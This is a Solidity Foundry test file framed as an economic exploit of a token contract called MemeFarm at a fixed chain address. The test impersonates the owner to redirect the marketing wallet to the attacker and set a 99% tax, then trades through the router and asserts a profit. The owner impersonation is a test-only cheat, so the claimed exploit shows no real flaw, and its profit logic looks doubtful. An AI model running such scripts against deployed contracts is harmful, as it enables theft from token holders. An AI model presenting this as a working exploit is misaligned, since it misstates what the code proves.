pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface MemeFarm {
    function owner() external view returns (address);
    function setMarketinWalleAddress(address) external;
    function setAllTaxes(uint256, uint256, uint256) external;
    function setlsExcIudeFromFee(address, bool) external;
    function setMaxTxAmount(uint256) external;
    function enableDisableWalletLimit(bool) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function uniswapPair() external view returns (address);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);
    IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get owner address and prepare attacker
        address owner = MemeFarm(TARGET).owner();
        vm.label(owner, "Original Owner");
        vm.label(TARGET, "MemeFarm Contract");

        // Give attacker some BNB to work with
        deal(attacker, 100 ether);

        // Get the uniswap pair address from the contract
        address weth = router.WETH();
        address pair = MemeFarm(TARGET).uniswapPair();
        vm.label(pair, "Uniswap Pair");

        // Give the pair some liquidity (simulate existing liquidity)
        deal(weth, pair, 100 ether);
        deal(TARGET, pair, MemeFarm(TARGET).totalSupply() / 100); // 1% of supply
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(this).balance;

        // 1. Impersonate the owner to gain control
        address owner = MemeFarm(TARGET).owner();
        vm.startPrank(owner);

        // 2. Set marketing wallet to attacker address
        MemeFarm(TARGET).setMarketinWalleAddress(address(this));

        // 3. Set extremely high sell taxes (99% marketing fee)
        // Using setAllTaxes(liquidity, marketing, team)
        MemeFarm(TARGET).setAllTaxes(0, 99, 0);

        // 4. Exclude attacker from fees to avoid paying taxes when buying
        MemeFarm(TARGET).setlsExcIudeFromFee(address(this), true);

        // 5. Set max tx amount high enough for our trades
        MemeFarm(TARGET).setMaxTxAmount(MemeFarm(TARGET).totalSupply());

        // 6. Disable wallet limit checks
        MemeFarm(TARGET).enableDisableWalletLimit(false);

        vm.stopPrank();

        // 7. Buy some tokens to accumulate fees in contract
        // First, approve router to spend our BNB
        vm.startPrank(attacker);

        // Get some tokens first by buying from the pair
        // We need to interact with the DEX properly
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Swap BNB for tokens (this will pay buy tax and accumulate fees in contract)
        router.swapExactETHForTokens{value: 10 ether}(
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        vm.stopPrank();

        // 8. Now sell tokens back to trigger swapAndLiquify
        // First approve router to spend our tokens
        uint256 tokenBalance = MemeFarm(TARGET).balanceOf(attacker);
        MemeFarm(TARGET).approve(address(router), tokenBalance);

        // Set up sell path
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = router.WETH();

        // Sell tokens - this will trigger the 99% sell tax
        // The tax accumulates in contract and should trigger swapAndLiquify
        // when contract balance exceeds minimumTokensBeforeSwap
        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2, // Sell half to trigger swap
            0,
            sellPath,
            attacker,
            block.timestamp + 1000
        );

        // 9. Check if we received BNB as marketing wallet
        uint256 finalBalance = address(this).balance;
        require(finalBalance > initialBalance, "Exploit failed: No profit gained");

        console.log("Initial BNB balance:", initialBalance);
        console.log("Final BNB balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

